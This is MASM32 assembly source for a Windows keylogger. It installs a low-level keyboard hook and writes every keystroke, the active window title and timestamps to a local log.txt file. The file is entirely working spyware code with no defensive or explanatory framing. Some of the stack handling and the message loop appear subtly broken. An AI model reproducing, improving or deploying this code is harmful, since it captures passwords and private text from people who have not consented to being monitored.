include \masm32\include\masm32rt.inc  

.data  
     prevWindowTitle db 256 dup(0)  ; Buffer to store the previous window title
    lastKeyWasEnter DWORD 1 
    logfilePath db "log.txt", 0         ; Path to the log file  
    logfile HANDLE 0                     ; Handle for the log file  
    newline db 13, 10, 0                  ; Newline characters for logging  
    keyName db 32 dup(0)                  ; Buffer to hold key names  
    timestamp db 32 dup(0)                ; Buffer to hold timestamp  
    timeFormat db "[%04d-%02d-%02d %02d:%02d:%02d] ", 0  ; Timestamp format with date
        activeWindowTitle db 256 dup(0)  ; Buffer for window title 
    backspaceMsg db " [Backspace] ", 0  ; String for backspace key  
    tabMsg db " [Tab] ", 0              ; String for tab key  
    spaceMsg db " [Space] ", 0          ; String for space key  
    leftCtrlMsg db " [Left Ctrl] ", 0    ; String for left control key  
    rightCtrlMsg db " [Right Ctrl] ", 0 ; String for right control key  
    leftShiftMsg db " [Left Shift] ", 0 ; String for left shift key  
    rightShiftMsg db " [Right Shift] ", 0 ; String for right shift key  
    leftAltMsg db " [Left Alt] ", 0     ; String for left alt key  
    rightAltMsg db " [Right Alt] ", 0       ; String for right alt key  
    pgUpMsg db " [Page Up] ", 0         ; String for Page Up key  
    pgDnMsg db "[Page Down]", 0         ; String for Page Down key  
    upArrowMsg db " [Arrow Up] ", 0      ; String for Up Arrow key  
    downArrowMsg db " [Arrow Down] ", 0 ; String for Down Arrow key  
    leftArrowMsg db " [Arrow Left] ", 0 ; String for Left Arrow key  
    rightArrowMsg db " [Arrow Right] ", 0 ; String for Right Arrow key  
    homeMsg db " [Home] ", 0               ; String for Home key  
    insertMsg db " [Insert] ", 0        ; String for Insert key  
    endMsg db " [End] ", 0               ; String for End key  
    deleteMsg db " [Delete] ", 0        ; String for Delete key  
    atMsg db " @", 0   
    exclamationMsg db " !", 0        ; String for the ! key  
    hashMsg db " #", 0              ; String for the # key  
    dollarMsg db " $", 0            ; String for the $ key  
    percentMsg db " %", 0           ; String for the % key  
    caretMsg db " ^", 0             ; String for the ^ key  
    ampersandMsg db " &", 0         ; String for the & key  
    asteriskMsg db " *", 0          ; String for the * key  
    openParenMsg db " (", 0         ; String for the ( key  
    closeParenMsg db " )", 0        ; String for the ) key                 
    f1 db " [F1] ", 0
    f2 db " [F2] ", 0
    f3 db " [F3] ", 0
    f4 db " [F4] ", 0
    f5 db " [F5] ", 0
    f6 db " [F6] ", 0
    f7 db " [F7] ", 0
    f8 db " [F8] ", 0
    f9 db " [F9] ", 0
    f10 db " [F10] ", 0
    f11 db " [F11] ", 0
    f12 db " [F12] ", 0
    escapeMsg db " [Escape] ", 0
    breakMsg db " [Break] ", 0
    clearMsg db " [Clear] ", 0
    pauseMsg db " [Pause] ", 0
    selectMsg db " [Select] ", 0
    executeMsg db " [Execute] ", 0
    helpMsg db " [Help] ", 0
    printMsg db " [Print] ", 0
    printScreenMsg db " [Print Screen] ", 0
    numLockMsg db " [Num Lock] ", 0
    scrollLockMsg db " [Scroll Lock] ", 0
    numpad0Msg db " [Numpad 0] ", 0
    numpad1Msg db " [Numpad 1] ", 0
    numpad2Msg db " [Numpad 2] ", 0
    numpad3Msg db " [Numpad 3] ", 0
    numpad4Msg db " [Numpad 4] ", 0
    numpad5Msg db " [Numpad 5] ", 0
    numpad6Msg db " [Numpad 6] ", 0
    numpad7Msg db " [Numpad 7] ", 0
    numpad8Msg db " [Numpad 8] ", 0
    numpad9Msg db " [Numpad 9] ", 0
    multiplyMsg db " [Multiply] ", 0
    addMsg db " [Add] ", 0
    separatorMsg db " [Separator] ", 0
    subtractMsg db " [Subtract] ", 0
    decimalMsg db " [Decimal] ", 0
    divideMsg db " [Divide] ", 0
    attnMsg db " [Attn] ", 0
    crselMsg db " [CrSel] ", 0
    exselMsg db " [ExSel] ", 0
    eofMsg db " [EoF] ", 0
    playMsg db " [Play] ", 0
    zoomMsg db " [Zoom] ", 0
    nonameMsg db " [No Name] ", 0
    pa1Msg db " [PA1] ", 0
    oemClearMsg db " [OEM Clear] ", 0
    capsLockMsg db " [Caps Lock] ", 0
    f13Msg db " [F13] ", 0
    f14Msg db " [F14] ", 0
    f15Msg db " [F15] ", 0
    f16Msg db " [F16] ", 0
    f17Msg db " [F17] ", 0
    f18Msg db " [F18] ", 0
    f19Msg db " [F19] ", 0
    f20Msg db " [F20] ", 0
    f21Msg db " [F21] ", 0
    f22Msg db " [F22] ", 0
    f23Msg db " [F23] ", 0
    f24Msg db " [F24] ", 0
    formatStr db "%c", 0                ; Format string for wsprintf  
    bytesWritten DWORD ?                ; Buffer for number of bytes written  

.code  

LogString PROC pszString:DWORD  
    ; Get the length of the string  
    LOCAL strLen:DWORD  
    invoke lstrlen, pszString           ; Get the length of the string  
    mov strLen, eax                     ; Store the length in strLen  
    invoke WriteFile, logfile, pszString, strLen, addr bytesWritten, 0  
    ret  
LogString ENDP  

GetActiveWindowTitle PROC  
    LOCAL hwnd:DWORD 
    invoke GetForegroundWindow  ; Get handle to active window  
    mov hwnd, eax  
    .IF hwnd != 0  
        invoke GetWindowTextA, hwnd, addr activeWindowTitle, sizeof activeWindowTitle  
    .ENDIF  
    ret  
GetActiveWindowTitle ENDP  

GetTimestamp PROC  
    LOCAL sysTime:SYSTEMTIME  
    invoke GetLocalTime, addr sysTime  ; Get the current local time  

    ; Zero-extend WORD values to DWORD before pushing  
    movzx eax, sysTime.wSecond         ; Zero-extend WORD to DWORD  
    push eax                           ; Push seconds  
    movzx eax, sysTime.wMinute         ; Zero-extend WORD to DWORD  
    push eax                           ; Push minutes  
    movzx eax, sysTime.wHour           ; Zero-extend WORD to DWORD  
    push eax                           ; Push hours  
    movzx eax, sysTime.wDay            ; Zero-extend WORD to DWORD  
    push eax                           ; Push day  
    movzx eax, sysTime.wMonth          ; Zero-extend WORD to DWORD  
    push eax                           ; Push month  
    movzx eax, sysTime.wYear           ; Zero-extend WORD to DWORD  
    push eax                           ; Push year  
    push offset timeFormat             ; Push format string  
    push offset timestamp              ; Push output buffer  
    call wsprintfA                     ; Format the timestamp  
    add esp, 32                        ; Clean up the stack (8 parameters * 4 bytes each)  

    ret  
GetTimestamp ENDP   

KeyboardProc PROC nCode:DWORD, wParam:DWORD, lParam:DWORD  
    ; Call the next hook if nCode < 0  
    .IF nCode < 0  
        invoke CallNextHookEx, 0, nCode, wParam, lParam  
        ret  
    .ENDIF  

    ; Check if key is pressed  
    .IF wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN  

        ; Get the current active window title
        invoke GetActiveWindowTitle

        ; Compare the current window title with the previous one
        invoke lstrcmp, addr activeWindowTitle, addr prevWindowTitle
        .IF eax != 0  ; If the titles are different, a switch has occurred
            ; Log the timestamp of the last keystroke in the previous application
            .IF prevWindowTitle[0] != 0  ; Check if prevWindowTitle is not empty
                invoke LogString, addr newline
                invoke GetTimestamp
                invoke LogString, addr timestamp
                invoke LogString, addr prevWindowTitle
                
            .ENDIF

            ; Update the previous window title
            invoke lstrcpy, addr prevWindowTitle, addr activeWindowTitle

            ; Log the new application title
            invoke LogString, addr newline
            invoke GetTimestamp
            invoke LogString, addr timestamp
            invoke LogString, addr activeWindowTitle
            invoke LogString, addr newline
        .ENDIF

        ; Rest of your key logging logic...
        mov eax, lParam  
        mov eax, [eax + 0] 
        ; Get the current timestamp  
        .IF eax == VK_RETURN  
            mov lastKeyWasEnter, 1  ; Set flag to indicate new line
            invoke LogString, addr newline  

        .ELSE  

            push eax
            cmp lastKeyWasEnter, 1  
            jne SkipTimestamp  ; Skip timestamp if it's not a new line  

            invoke LogString, addr newline
            invoke GetActiveWindowTitle   ; Capture active window title  
            invoke LogString, addr activeWindowTitle  
            invoke LogString, addr newline

            ; Get the current timestamp only once per line  
            invoke GetTimestamp  
            invoke LogString, addr timestamp  
            mov lastKeyWasEnter, 0  ; Reset flag after logging 
            pop eax
            jmp SkipTimestamp
        .ENDIF  


        SkipTimestamp:
        .IF eax == VK_BACK  
            invoke LogString, addr backspaceMsg  
        .ELSEIF eax == VK_TAB  
            invoke LogString, addr tabMsg  
        .ELSEIF eax == VK_SPACE  
            invoke LogString, addr spaceMsg  
        .ELSEIF eax == VK_LCONTROL  
            invoke LogString, addr leftCtrlMsg  
        .ELSEIF eax ==  VK_CAPITAL 
            invoke LogString, addr capsLockMsg 
        .ELSEIF eax == VK_RCONTROL  
            invoke LogString, addr rightCtrlMsg  
        .ELSEIF eax == VK_LSHIFT  
            invoke LogString, addr leftShiftMsg  
        .ELSEIF eax == VK_RSHIFT  
            invoke LogString, addr rightShiftMsg  
        .ELSEIF eax == VK_LMENU  
            invoke LogString, addr leftAltMsg  
        .ELSEIF eax == VK_RMENU  
            invoke LogString, addr rightAltMsg  
        .ELSEIF eax == VK_PRIOR  
            invoke LogString, addr pgUpMsg  
        .ELSEIF eax == VK_NEXT  
            invoke LogString, addr pgDnMsg  
        .ELSEIF eax == VK_UP  
            invoke LogString, addr upArrowMsg  
        .ELSEIF eax == VK_DOWN  
            invoke LogString, addr downArrowMsg  
        .ELSEIF eax == VK_LEFT  
            invoke LogString, addr leftArrowMsg  
        .ELSEIF eax == VK_RIGHT  
            invoke LogString, addr rightArrowMsg  
        .ELSEIF eax == VK_HOME  
            invoke LogString, addr homeMsg  
        .ELSEIF eax == VK_INSERT  
            invoke LogString, addr insertMsg  
        .ELSEIF eax == VK_END  
            invoke LogString, addr endMsg  
        .ELSEIF eax == VK_DELETE  
            invoke LogString, addr deleteMsg  
        .ELSEIF eax == VK_1
           push eax    
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr exclamationMsg 
            .ELSE 
            pop eax 
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANS  
            invoke LogString, addr keyName  
            .ENDIF 
        .ELSEIF eax == VK_2  
          push eax  
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr atMsg 
            .ELSE 
             pop eax                      ; Convert to ASCII character  
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
            .ENDIF 
      .ELSEIF eax == VK_3   
         push eax 
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr  hashMsg
            .ELSE 
             pop eax
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
            .ENDIF
        .ELSEIF eax == VK_4  
           push eax  
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr   dollarMsg
            .ELSE 
              pop eax
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
            .ENDIF
        .ELSEIF eax == VK_5 
           push eax   
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr  percentMsg
            .ELSE 
             pop eax  
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
            .ENDIF
        .ELSEIF eax == VK_6 
           push eax   
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr  caretMsg
            .ELSE 
            pop eax 
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
            .ENDIF
        .ELSEIF eax == VK_7 
           push eax   
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr   ampersandMsg
            .ELSE 
            pop eax
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
            .ENDIF
        .ELSEIF eax == VK_8
           push eax   
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr   asteriskMsg
            .ELSE 
            pop eax
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
            .ENDIF
        .ELSEIF eax == VK_9 
           push eax   
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr  openParenMsg
            .ELSE 
            pop eax
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
            .ENDIF
        .ELSEIF eax == VK_0 
           push eax   
            invoke GetAsyncKeyState, VK_SHIFT  
            .IF eax !=0   
                invoke LogString, addr closeParenMsg
            .ELSE 
            pop eax
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
            .ENDIF
        .ELSEIF eax >= VK_A && eax <= VK_Z
              push eax   
               invoke GetAsyncKeyState, VK_SHIFT  
                 .IF eax !=0   
                   pop eax
                   invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
                   invoke LogString, addr keyName 
                 .ELSE 
                    pop eax
                    add eax,32
                    invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
                    invoke LogString, addr keyName  
                 .ENDIF
        .ELSEIF eax == VK_ESCAPE
            invoke LogString, addr escapeMsg
        .ELSEIF eax == VK_CANCEL
            invoke LogString, addr breakMsg
        .ELSEIF eax == VK_CLEAR
            invoke LogString, addr clearMsg
        .ELSEIF eax == VK_PAUSE
            invoke LogString, addr pauseMsg
        .ELSEIF eax == VK_SELECT
            invoke LogString, addr selectMsg
        .ELSEIF eax == VK_EXECUTE
            invoke LogString, addr executeMsg
        .ELSEIF eax == VK_HELP
            invoke LogString, addr helpMsg
        .ELSEIF eax == VK_PRINT
            invoke LogString, addr printMsg
        .ELSEIF eax == VK_SNAPSHOT
            invoke LogString, addr printScreenMsg
        .ELSEIF eax == VK_NUMLOCK
            invoke LogString, addr numLockMsg
        .ELSEIF eax == VK_SCROLL
            invoke LogString, addr scrollLockMsg
        .ELSEIF eax == VK_NUMPAD0
            invoke LogString, addr numpad0Msg
        .ELSEIF eax == VK_NUMPAD1
            invoke LogString, addr numpad1Msg
        .ELSEIF eax == VK_NUMPAD2
            invoke LogString, addr numpad2Msg
        .ELSEIF eax == VK_NUMPAD3
            invoke LogString, addr numpad3Msg
        .ELSEIF eax == VK_NUMPAD4
            invoke LogString, addr numpad4Msg
        .ELSEIF eax == VK_NUMPAD5
            invoke LogString, addr numpad5Msg
        .ELSEIF eax == VK_NUMPAD6
            invoke LogString, addr numpad6Msg
        .ELSEIF eax == VK_NUMPAD7
            invoke LogString, addr numpad7Msg
        .ELSEIF eax == VK_NUMPAD8
            invoke LogString, addr numpad8Msg
        .ELSEIF eax == VK_NUMPAD9
            invoke LogString, addr numpad9Msg
        .ELSEIF eax == VK_MULTIPLY
            invoke LogString, addr multiplyMsg
        .ELSEIF eax == VK_ADD
            invoke LogString, addr addMsg
        .ELSEIF eax == VK_SEPARATOR
            invoke LogString, addr separatorMsg
        .ELSEIF eax == VK_SUBTRACT
            invoke LogString, addr subtractMsg
        .ELSEIF eax == VK_DECIMAL
            invoke LogString, addr decimalMsg
        .ELSEIF eax == VK_DIVIDE
            invoke LogString, addr divideMsg
        .ELSEIF eax == VK_F13
            invoke LogString, addr f13Msg
        .ELSEIF eax == VK_F14
            invoke LogString, addr f14Msg
        .ELSEIF eax == VK_F15
            invoke LogString, addr f15Msg
        .ELSEIF eax == VK_F16
            invoke LogString, addr f16Msg
        .ELSEIF eax == VK_F17
            invoke LogString, addr f17Msg
        .ELSEIF eax == VK_F18
            invoke LogString, addr f18Msg
        .ELSEIF eax == VK_F19
            invoke LogString, addr f19Msg
        .ELSEIF eax == VK_F20
            invoke LogString, addr f20Msg
        .ELSEIF eax == VK_F21
            invoke LogString, addr f21Msg
        .ELSEIF eax == VK_F22
            invoke LogString, addr f22Msg
        .ELSEIF eax == VK_F23
            invoke LogString, addr f23Msg
        .ELSEIF eax == VK_F24
            invoke LogString, addr f24Msg
        .ELSEIF eax == VK_ATTN
            invoke LogString, addr attnMsg
        .ELSEIF eax == VK_CRSEL
            invoke LogString, addr crselMsg
        .ELSEIF eax == VK_EXSEL
            invoke LogString, addr exselMsg
        .ELSEIF eax == VK_EREOF
            invoke LogString, addr eofMsg
        .ELSEIF eax == VK_PLAY
            invoke LogString, addr playMsg
        .ELSEIF eax == VK_ZOOM
            invoke LogString, addr zoomMsg
        .ELSEIF eax == VK_NONAME
            invoke LogString, addr nonameMsg
        .ELSEIF eax == VK_PA1
            invoke LogString, addr pa1Msg
        .ELSEIF eax == VK_OEM_CLEAR
            invoke LogString, addr oemClearMsg
        .ELSEIF eax == VK_F1  
            invoke LogString, addr f1  
        .ELSEIF eax == VK_F2  
            invoke LogString, addr f2  
        .ELSEIF eax == VK_F3  
            invoke LogString, addr f3  
        .ELSEIF eax == VK_F4  
            invoke LogString, addr f4  
        .ELSEIF eax == VK_F5  
            invoke LogString, addr f5  
        .ELSEIF eax == VK_F6  
            invoke LogString, addr f6  
        .ELSEIF eax == VK_F7  
            invoke LogString, addr f7  
        .ELSEIF eax == VK_F8  
            invoke LogString, addr f8  
        .ELSEIF eax == VK_F9  
            invoke LogString, addr f9  
        .ELSEIF eax == VK_F10  
            invoke LogString, addr f10  
        .ELSEIF eax == VK_F11  
            invoke LogString, addr f11  
        .ELSEIF eax == VK_F12  
            invoke LogString, addr f12  
        .ELSE  
            invoke MapVirtualKeyA, eax, 2       ; Map key to character  
            movzx eax, al                       ; Convert to ASCII character  
            invoke wsprintfA, addr keyName, addr formatStr, al ; Use wsprintfA for ANSI  
            invoke LogString, addr keyName  
        .ENDIF  

    .ENDIF  

    ; Call next hook in the chain  
    invoke CallNextHookEx, 0, nCode, wParam, lParam  

    ret  
KeyboardProc ENDP  

start:   
 
    invoke CreateFileA, addr logfilePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL  
    mov logfile, eax  
    invoke SetFilePointer, logfile, 0, NULL, FILE_END  
    invoke SetWindowsHookExA, WH_KEYBOARD_LL, addr KeyboardProc, NULL, NULL  

    .WHILE TRUE  
        invoke GetMessageA, NULL, 0, 0, 0  
        invoke TranslateMessage, 0  
        invoke DispatchMessageA, 0  
    .ENDW  

    invoke UnhookWindowsHookEx, 0  
    invoke CloseHandle, logfile  
    invoke ExitProcess, 0  

end start
